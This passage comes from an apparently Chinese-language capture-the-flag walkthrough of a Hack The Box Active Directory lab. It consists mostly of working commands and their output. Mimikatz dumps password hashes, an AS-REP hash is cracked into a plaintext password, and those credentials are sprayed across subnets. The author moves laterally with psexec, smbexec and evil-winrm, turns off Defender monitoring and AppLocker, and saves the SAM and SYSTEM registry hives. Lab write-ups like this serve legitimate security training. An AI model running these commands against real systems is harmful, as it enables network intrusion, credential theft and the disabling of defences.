        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40156 (00000000:00009cdc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:57
SID               : 
        msv :
         [00000003] Primary
         * Username : SRV01$
         * Domain   : RLAB
         * NTLM     : ff6b0335cc1a85d404129df294ce45ab
         * SHA1     : ed2ce72ebd4780136cb03b548a7346a418bc33cd
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:57
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SRV01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : srv01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
Using 'C:\Users\Public\out.txt' for logfile : OK
```

### lsadump::sam
```plain
execute -f C:\\Users\\Public\\PsExec.exe -a "\\\\10.10.120.15 -s cmd /c C:\\Users\\Public\\mimikatz.exe \"log C:\\Users\\Public\\out1.txt\" \"privilege::debug\" \"lsadump::sam\" exit"
```

```plain
PS z:\Users\Public> type out1.txt
Using 'C:\Users\Public\out1.txt' for logfile : OK

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : SRV01
SysKey : c8f57878e04b2e206f4b4341a9ab53da
Local SID : S-1-5-21-146526057-609054067-1454999008

SAMKey : ee8d8df48fd86fabe37b43b6db080069

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d21e2cb712512587d26658e36694d97e
    lm  - 0: 7cb9d655d39c1951cf4170d65281dfe0
    lm  - 1: 671c62ca6da190399748ceace6bafece
    lm  - 2: 1d229ce22e7c50deb53e7622ae5d89e2
    lm  - 3: 346409c6f183d2caa08b44f7a6ff6374
    lm  - 4: 60715fcd7cf5145d1ea4b4f1b4dd0a7f
    lm  - 5: 1895018baee5bb0281e3689e2b9c266b
    lm  - 6: 605a522a9521281455ff542a55a82c5a
    lm  - 7: ca997847a1b47c483651d8ee72ba2671
    lm  - 8: aca30d286dd0ff7e139e67e50f24d746
    lm  - 9: cd9909e735012fbd66453df31a5d583d
    lm  -10: 0e71d0615b3bf41dcf00907bba2724ba
    lm  -11: 0bab8f1bb02813644d95a3d93c5f9312
    lm  -12: 7832c8df652ce139a6c844c167ffe13f
    lm  -13: 62fda6b261b4dcb595780dbe86658333
    lm  -14: 9621afd2a1b2e2e3d64502031b0b1c89
    lm  -15: 8ce12ef941d1b7fce199cf41a6fcd5f6
    lm  -16: af3cb59d466dd9561f99843131df3537
    lm  -17: 5e76f1b86adc0fc39f9a9e2c4b797f6e
    lm  -18: bb2a787b8aa859be8548ad86f0351c37
    lm  -19: 8ff85d4c20741088ec2a93532fb743cb
    lm  -20: 8c9f90c473bb8b8745baa6d7feb169bc
    ntlm- 0: d21e2cb712512587d26658e36694d97e
    ntlm- 1: 16c024e1feedfb917091b2100e803384
    ntlm- 2: 54b3820b79395a18feaedc54cb827d02
    ntlm- 3: 64cbd64d083f53818e63137e3ecd32b9
    ntlm- 4: 036bdc0c18e03f9f67b58b92c5d710ae
    ntlm- 5: f5646444de9f91257562f1be6e69916b
    ntlm- 6: f6fac3d544242360fb054ee012427e28
    ntlm- 7: 0811e90f28f4977cc52e3cfc1e0e42f3
    ntlm- 8: 4c1600639b6b4b7607a7d974b9a681f4
    ntlm- 9: 6d4636568e31b825964acd6fe2bd3022
    ntlm-10: 3ed62e05c05da6778e7126994ca86d2e
    ntlm-11: 9ae6b1706fbd2bc261ada869ec697831
    ntlm-12: 3c4e50bb442cd4b325795dbc89b35702
    ntlm-13: 676cd41c730fbde68d6d4817ddf0c776
    ntlm-14: 37b015165dba3051ca536071ea2c54a5
    ntlm-15: 3e9ac6ccea00b9009288ccb83437c900
    ntlm-16: 00270b2a867c269c86982d129537399c
    ntlm-17: fe6fd04bdc7bfbb09fc5d30bc9317181
    ntlm-18: fc525c9683e8fe067095ba2ddc971889
    ntlm-19: 20c71b20b26915c9e8a73e45c2c01433
    ntlm-20: ae7082ccdfaac79f25030e4293ce837b
    ntlm-21: fc525c9683e8fe067095ba2ddc971889

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

mimikatz(commandline) # exit
Bye!
```

### lsadump::cache
```plain
execute -f C:\\Users\\Public\\PsExec.exe -a "\\\\10.10.120.15 -s cmd /c C:\\Users\\Public\\mimikatz.exe \"log C:\\Users\\Public\\out2.txt\" \"privilege::debug\" \"lsadump::cache\" exit"
```

```plain
PS z:\Users\Public> type out2.txt
Using 'C:\Users\Public\out2.txt' for logfile : OK

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::cache
Domain : SRV01
SysKey : c8f57878e04b2e206f4b4341a9ab53da

Local name : SRV01 ( S-1-5-21-146526057-609054067-1454999008 )
Domain name : RLAB ( S-1-5-21-1396373213-2872852198-2033860859 )
Domain FQDN : rastalabs.local

Policy subsystem is : 1.14
LSA Key(s) : 1, default {c0637a2b-27ac-fb0f-d980-07ac47ca4848}
  [00] {c0637a2b-27ac-fb0f-d980-07ac47ca4848} b47252932b7cf3397e689f38c915bd3ddc3e064b4da59a88b16d690397811642

* Iteration is set to default (10240)

[NL$1 - 10/08/2022 21:57:06]
RID       : 00000489 (1161)
User      : RLAB\rweston_da
MsCacheV2 : 24c8e9ab0617120753dc6d5ea9262ea6

[NL$2 - 11/12/2024 05:59:49]
RID       : 000001f4 (500)
User      : RLAB\Administrator
MsCacheV2 : 4846fb364be3573b565cdf0b9d1798af

mimikatz(commandline) # exit
Bye!
```

## bloodhound
```plain
meterpreter > upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 C:\\Users\\Public\\SharpHound.ps1
PS C:\Users\Public> powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound"
```

```plain
powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
```

```plain
meterpreter > download C:\\Users\\Public\\20260315142354_BloodHound.zip
[*] Downloading: C:\Users\Public\20260315142354_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315142354_BloodHound.zip
[*] Downloaded 36.25 KiB of 36.25 KiB (100.0%): C:\Users\Public\20260315142354_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315142354_BloodHound.zip
[*] Completed  : C:\Users\Public\20260315142354_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315142354_BloodHound.zip
meterpreter > download C:\\Users\\Public\\20260315143135_BloodHound.zip
[*] Downloading: C:\Users\Public\20260315143135_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315143135_BloodHound.zip
[*] Downloaded 36.25 KiB of 36.25 KiB (100.0%): C:\Users\Public\20260315143135_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315143135_BloodHound.zip
[*] Completed  : C:\Users\Public\20260315143135_BloodHound.zip -> /home/kali/Desktop/htb/rastalabs/20260315143135_BloodHound.zip
```



# SRV01-10.10.120.15-RLAB\NGODFREY
## Bloodhound
在bloodhound查询**<font style="color:rgb(13, 13, 13);">AS-REP Roasting</font>**

```plain
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

## GetNPUsers
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q GetNPUsers.py RASTALABS.LOCAL/NGODFREY -dc-ip 10.10.120.1 -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for NGODFREY
$krb5asrep$23$NGODFREY@RASTALABS.LOCAL:64181b74869a9afde4a0bfee384a6eb7$9440b0c93b042cbae91b17201688762453e6d3ec5e13eb7a81aee080e13972808f931c1e8ee0383be561f265e21c6555452790544fe11696f5b842f2d3b77316c39e80858ed521fd6d5adf38cb8b2f02695f830075e4d3d8d965ef7c219a092d07ae676356b1d16d312cf1fdeb13bc1a79125d5899f2619a2decaa9e8784dd13b0b62ad2ef76dcb2fdb4d1d8530729478faa58f8f0187d1c2562bf0058790a361e685eb4a36f6cee4bfeb085407e7a17c3c587c4c1504c9ce8dfd7015968ac7a203708c5c990a74547cd94bd6f6dc03808f5e8f05209d39335991f084f4e1fb7666a6d247048954a5f96ebb3f03367c632c5                                   
```

## Hashcat
```plain
nano asrep.txt
$krb5asrep$23$NGODFREY@RASTALABS.LOCAL:64181b74869a9afde4a0bfee384a6eb7$9440b0c93b042cbae91b17201688762453e6d3ec5e13eb7a81aee080e13972808f931c1e8ee0383be561f265e21c6555452790544fe11696f5b842f2d3b77316c39e80858ed521fd6d5adf38cb8b2f02695f830075e4d3d8d965ef7c219a092d07ae676356b1d16d312cf1fdeb13bc1a79125d5899f2619a2decaa9e8784dd13b0b62ad2ef76dcb2fdb4d1d8530729478faa58f8f0187d1c2562bf0058790a361e685eb4a36f6cee4bfeb085407e7a17c3c587c4c1504c9ce8dfd7015968ac7a203708c5c990a74547cd94bd6f6dc03808f5e8f05209d39335991f084f4e1fb7666a6d247048954a5f96ebb3f03367c632c5
```

[https://github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/kwprocessor]
└─# ./kwp -z basechars/full.base ./keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/kwp.txt
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/kwp.txt    
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2492 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/kwp.txt
* Passwords.: 1340696
* Bytes.....: 15609762
* Keyspace..: 1340696
* Runtime...: 0 secs

$krb5asrep$23$NGODFREY@RASTALABS.LOCAL:64181b74869a9afde4a0bfee384a6eb7$9440b0c93b042cbae91b17201688762453e6d3ec5e13eb7a81aee080e13972808f931c1e8ee0383be561f265e21c6555452790544fe11696f5b842f2d3b77316c39e80858ed521fd6d5adf38cb8b2f02695f830075e4d3d8d965ef7c219a092d07ae676356b1d16d312cf1fdeb13bc1a79125d5899f2619a2decaa9e8784dd13b0b62ad2ef76dcb2fdb4d1d8530729478faa58f8f0187d1c2562bf0058790a361e685eb4a36f6cee4bfeb085407e7a17c3c587c4c1504c9ce8dfd7015968ac7a203708c5c990a74547cd94bd6f6dc03808f5e8f05209d39335991f084f4e1fb7666a6d247048954a5f96ebb3f03367c632c5:zaq123$%^&*()_+
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$NGODFREY@RASTALABS.LOCAL:64181b74869a...c632c5
Time.Started.....: Sat Mar 14 13:40:15 2026 (1 sec)
Time.Estimated...: Sat Mar 14 13:40:16 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/kwp.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1083.2 kH/s (2.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 774144/1340696 (57.74%)
Rejected.........: 0/774144 (0.00%)
Restore.Point....: 770048/1340696 (57.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: WERTRErtyuiop[ -> CvbnHY^Y
Hardware.Mon.#01.: Util: 32%

Started: Sat Mar 14 13:40:14 2026
Stopped: Sat Mar 14 13:40:17 2026
```

成功拿到密码"zaq123$%^&*()_+"

```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\bowen\Desktop> net user ngodfrey /domain
The request will be processed at a domain controller for domain rastalabs.local.

User name                    ngodfrey
Full Name                    Nicholas Godfrey
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            15/11/2017 10:01:37
Password expires             Never
Password changeable          16/11/2017 10:01:37
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\fs01.rastalabs.local\home$\ngodfrey
Last logon                   14/03/2026 05:19:38

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

## Outlook
![](/image/hackthebox-prolabs/RastaLabs-13.png)

```plain
rastalabs.local\ngodfrey
zaq123$%^&*()_+
```

通过凭据登录邮件系统

![](/image/hackthebox-prolabs/RastaLabs-14.png)

邮件中得到packetcapture.cap

## Wireshark
![](/image/hackthebox-prolabs/RastaLabs-15.png)

### HTTP 请求
关键内容在这里：

```plain
POST / HTTP/1.1
```

说明客户端向服务器发送 **POST 请求**。

---

### HTTP Header
```plain
POST / HTTP/1.1
Host: 35.177.47.80
Referer: http://35.177.47.80/
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0)
Content-Type: multipart/form-data
Content-Length: 357
```

重点信息：

| 字段 | 含义 |
| --- | --- |
| Host | 35.177.47.80 |
| 浏览器 | IE11 |
| 类型 | multipart/form-data |
| 长度 | 357 |


说明：

**这是一个文件上传表单。**

### 上传的文件
**在 multipart 里：**

```plain
Content-Disposition: form-data; name="file"; filename="secret"
Content-Type: application/octet-stream
```

**说明上传的文件：**

```plain
filename = secret
type = binary
```

---

### 文件内容
**文件数据：**

```plain
10 00 00 00
02 6e 24 47 ea a2 f6 4a d2
0c ae 72 cd ef 3f 0e 49
69 97 2c 74 8d 7e 7c f6
cf 0f a3 16 3e 8b 71 db
c5 c4 e5 1f 6f 26 a4 64
3f a9 b0 d5 0e 3c b0
```

**这是 二进制数据**

## crackmapexec
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q crackmapexec smb 10.10.120.1/24 -u ngodfrey -p 'zaq123$%^&*()_+'
SMB         10.10.120.1     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.15    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.10    445    MX01             [*] Windows Server 2016 Standard 14393 x64 (name:MX01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.5     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.1     445    DC01             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.120.15    445    SRV01            [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ (Pwn3d!)                                                                                                       
SMB         10.10.120.10    445    MX01             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.120.5     445    FS01             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 

┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec smb 10.10.121.1/24 -u ngodfrey -p 'zaq123$%^&*()_+'
SMB         10.10.121.112   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.107   445    WS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS02) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.108   445    WS06             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS06) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.112   445    WS01             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.121.107   445    WS02             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.121.108   445    WS06             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 

┌──(kali㉿kali)-[~]
└─$ proxychains -q crackmapexec smb 10.10.122.1/24 -u ngodfrey -p 'zaq123$%^&*()_+'
SMB         10.10.122.25    445    SQL02            [*] Windows Server 2016 Standard 14393 x64 (name:SQL02) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.15    445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.25    445    SQL02            [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.122.15    445    SQL01            [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 

┌──(kali㉿kali)-[~]
└─$ proxychains -q crackmapexec smb 10.10.123.1/24 -u ngodfrey -p 'zaq123$%^&*()_+'
SMB         10.10.123.100   445    WS03             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS03) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.100   445    WS03             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.123.101   445    WS04             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS04) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.110   445    WS05             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS05) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.101   445    WS04             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
SMB         10.10.123.110   445    WS05             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ 
```

## Evil-WinRM
```plain
proxychains -q evil-winrm -i 10.10.120.15 -u ngodfrey -p 'zaq123$%^&*()_+'
```

## psexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q psexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.120.15.....
[*] Found writable share ADMIN$
[*] Uploading file WnJOlRuq.exe
[*] Opening SVCManager on 10.10.120.15.....
[*] Creating service ordf on 10.10.120.15.....
[*] Starting service ordf.....
[*] Opening SVCManager on 10.10.120.15.....
[-] Error performing the uninstallation, cleaning up                                                   
```

登录失败了

## wmiexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q wmiexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rlab\ngodfrey
```

不是system权限，换一个

## smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q smbexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```



## Sharphound
### upload exe
```plain
*Evil-WinRM* PS C:\Users\ngodfrey\Desktop> upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe C:\\Users\\ngdfrey\\SharpHound.exe
```

上传失败了

```plain
powershell -ep bypass -nop -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true'
```

嘶，还是失败了

```plain
powershell -c iwr "http://10.10.16.2:443/SharpHound.exe" -outfile "C:\\Users\\ngodfrey\\SharpHound.exe"
```

好吧原来是网络不联通导致的

```plain
meterpreter > upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe C:\\Users\\Public\\SharpHound.exe
[*] Uploading  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
[*] Uploaded 2.02 MiB of 2.02 MiB (100.0%): /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
[*] Completed  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
```

```plain
net use z: \\10.10.120.15\c$
copy C:\Users\Public\SharpHound.exe z:\Users\Public\SharpHound.exe
```

```plain
*Evil-WinRM* PS C:\Users\Public> move SharpHound.exe C:\Windows\Temp\SharpHound.exe
*Evil-WinRM* PS C:\Users\Public> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> .\SharpHound.exe -c All
*Evil-WinRM* PS C:\Windows\Temp> dir
```

### Get-AppLockerPolicy
```plain
*Evil-WinRM* PS C:\Windows\Temp> Get-AppLockerPolicy -Effective

Version RuleCollections
------- ---------------
      1 {Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePublisherRule, Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.RuleCollection, Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePublisherRul...
```

难怪失败了原来有Applocker

策略是 **Publisher-based rule**。

也就是：

只允许 **微软签名程序**运行，例如：

+ `C:\Windows\*`
+ `C:\Program Files\*`
+ **Microsoft signed binaries**

而：

```plain
SharpHound.exe
```

不是微软签名，所以 **直接被拦截执行**（不会报错）

### upload ps1
```plain
meterpreter > upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 C:\\Users\\Public\\SharpHound.ps1
[*] Uploading  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 -> C:\Users\Public\SharpHound.ps1
[*] Uploaded 1.60 MiB of 1.60 MiB (100.0%): /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 -> C:\Users\Public\SharpHound.ps1
[*] Completed  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 -> C:\Users\Public\SharpHound.ps1
```

```plain
copy C:\Users\Public\SharpHound.ps1 z:\Users\Public\SharpHound.ps1
```

### bypass(失败)
#### 1️⃣ PowerShell 是 Constrained Language Mode
报错：

```plain
Cannot create type. Only core types are supported in this language mode.
```

说明：

+ .NET 调用被禁止
+ `New-Object`
+ `Reflection`
+ `Import-Module`

都会被拦。

这也是 **SharpHound** 无法运行的原因。

---

#### 2️⃣ AppLocker Publisher Rules
你看到：

```plain
FilePublisherRule
```

说明：

只允许 **微软签名程序**运行。

所以：

```plain
SharpHound.exe
```

不会执行。

---

#### 3️⃣ PowerShell v2 被移除
你试了：

```plain
powershell.exe -version 2
```

返回：

```plain
.NET Framework v2 not installed
```

说明经典 **CLM bypass** 被关闭。

---

#### 4️⃣ LOLBins 也被限制
你运行：

```plain
MSBuild.exe
```

结果：

```plain
blocked by group policy
```

说明管理员把常见 LOLBins 也封了。

### bypass-smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q smbexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32> powershell -ep bypass -c "Import-Module C:\Users\Public\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -ZipFileName loot.zip"
```

```plain
C:\Windows>copy z:\Users\Public\20260315141355_loot.zip C:\Users\Public\20260315141355_loot.zip
copy z:\Users\Public\20260315141355_loot.zip C:\Users\Public\20260315141355_loot.zip
        1 file(s) copied.
```

```plain
meterpreter > download z:\\Users\\Public\\20260315141355_loot.zip
[*] Downloading: z:\Users\Public\20260315141355_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260315141355_loot.zip

[*] Downloaded 36.65 KiB of 36.65 KiB (100.0%): z:\Users\Public\20260315141355_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260315141355_loot.zip
[*] Completed  : z:\Users\Public\20260315141355_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260315141355_loot.zip
```

## secretsdump 
```plain
*Evil-WinRM* PS C:\Users\ngodfrey> reg save HKLM\SAM C:\ProgramData\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\ngodfrey> reg save HKLM\SYSTEM C:\ProgramData\system
The operation completed successfully.

*Evil-WinRM* PS C:\ProgramData> copy C:\ProgramData\sam C:\Users\ngodfrey\sam
*Evil-WinRM* PS C:\ProgramData> copy C:\ProgramData\system C:\Users\ngodfrey\system

*Evil-WinRM* PS C:\Users\ngodfrey> certutil -encode sam sam.txt
Input Length = 65536
Output Length = 90172
CertUtil: -encode command completed successfully.
*Evil-WinRM* PS C:\Users\ngodfrey> certutil -encode system system.txt
Input Length = 15831040
Output Length = 21767740
CertUtil: -encode command completed successfully.
```

下载不下来，懒得搞了，直接type sam.txt然后保存到kali即可，之所以没继续是因为之前mimiktz已经抓取下来

## Bypass AppLocker
### psexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q psexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.120.15.....
[*] Found writable share ADMIN$
[*] Uploading file ZXOumrDq.exe
[*] Opening SVCManager on 10.10.120.15.....
[*] Creating service cthY on 10.10.120.15.....
[*] Starting service cthY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### bypass
```plain
proxychains -q psexec.py ngodfrey:'zaq123$%^&*()_+'@10.10.120.15
C:\Windows\system32> powershell
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
PS C:\Windows\system32> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

拿到FullLanguage，成功bypass applocker但仅限当前窗口

```plain
sc.exe stop appidsvc
sc.exe config appidsvc start= disabled
powershell
$ExecutionContext.SessionState.LanguageMode
```

全部用户关闭Applocker

## PowerView
### upload
```plain
meterpreter > upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 C:\\Users\\Public\\PowerView.ps1
[*] Uploading  : /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 -> C:\Users\Public\PowerView.ps1
[*] Uploaded 752.22 KiB of 752.22 KiB (100.0%): /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 -> C:\Users\Public\PowerView.ps1
[*] Completed  : /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 -> C:\Users\Public\PowerView.ps1
```

```plain
C:\Windows>copy C:\Users\Public\PowerView.ps1 z:
copy C:\Users\Public\PowerView.ps1 z:
        1 file(s) copied.
```

### Load
```plain
PS C:\Windows\system32> Import-Module C:\PowerView.ps1
```

### Get-NetLocalGroupMember
```plain
PS C:\Windows\system32> Get-NetLocalGroupMember                                                         
                                                                                                        
                                                                                                        
ComputerName : SRV01                                                                                    
GroupName    : Administrators                                                                           
MemberName   : SRV01\Administrator                                                                      
SID          : S-1-5-21-146526057-609054067-1454999008-500                                              
IsGroup      : False
IsDomain     : False

ComputerName : SRV01
GroupName    : Administrators
MemberName   : RLAB\Domain Admins
SID          : S-1-5-21-1396373213-2872852198-2033860859-512
IsGroup      : True
IsDomain     : True

ComputerName : SRV01
GroupName    : Administrators
MemberName   : RLAB\Domain Users
SID          : S-1-5-21-1396373213-2872852198-2033860859-513
IsGroup      : True
IsDomain     : True

```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/1/2021  10:14 AM             22 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
RASTA{4ppl0ck32_5uck5}
```

# FS01-10.10.120.5-RLAB\NGODFREY
## 挂载磁盘
```plain
net use M: \\fs01.rastalabs.local\home$\ngodfrey /user:ngodfrey "zaq123$%^&*()_+"
The command completed successfully.
```

## Getflag
```plain
*Evil-WinRM* PS M:\Desktop> type flag.txt
RASTA{k3rb3r05_15_7r1cky}
```

## Passwords
### Documents
```plain
*Evil-WinRM* PS C:\Users\ngodfrey\Documents> dir M:\documents


    Directory: M:\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/25/2017   7:40 PM            187 Passwords-Key.key
-a----       11/21/2017   3:22 PM           2174 Passwords.kdbx
```

### Download
```plain
*Evil-WinRM* PS C:\Users\Public> copy M:\documents\Passwords.kdbx C:\Users\Public
 
